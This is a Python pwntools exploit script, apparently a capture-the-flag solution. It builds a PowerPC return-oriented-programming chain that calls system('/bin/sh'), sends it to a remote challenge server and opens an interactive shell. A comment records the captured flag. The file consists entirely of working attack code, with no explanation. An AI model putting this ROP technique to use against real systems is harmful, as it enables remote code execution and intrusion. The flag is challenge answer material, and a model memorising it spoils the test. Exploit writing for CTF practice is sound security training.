#!/usr/bin/env python3
import struct

from pwn import *
def main():
    main = 0x10000634
    system = 0x10008110
    bin_sh = 0x10077A8C
    buf_off = 8
    lr_off = 0x24
    # lwz r3, 0x10(r1) ; lwz r0, 0x24(r1) ; lwz r30, 0x18(r1) ; addi r1, r1, 0x20 ; mtlr r0 ; blr
    gadget = 0x100712B4
    with remote("sp33d.play.hfsc.tf", 20020) as tube:
        rop = flat({
            # lr_off - buf_off
            0x1c: struct.pack(">I", gadget),
            # stack is now at 0x18
            0x28: struct.pack(">I", bin_sh),
            0x3c: struct.pack(">I", system),
        })
        tube.sendafter(b"pwn: ", rop)
        tube.interactive()
        # midnight{2df7d44f7136ae86f395ddf8212fe59e}
if __name__ == "__main__":
    main()
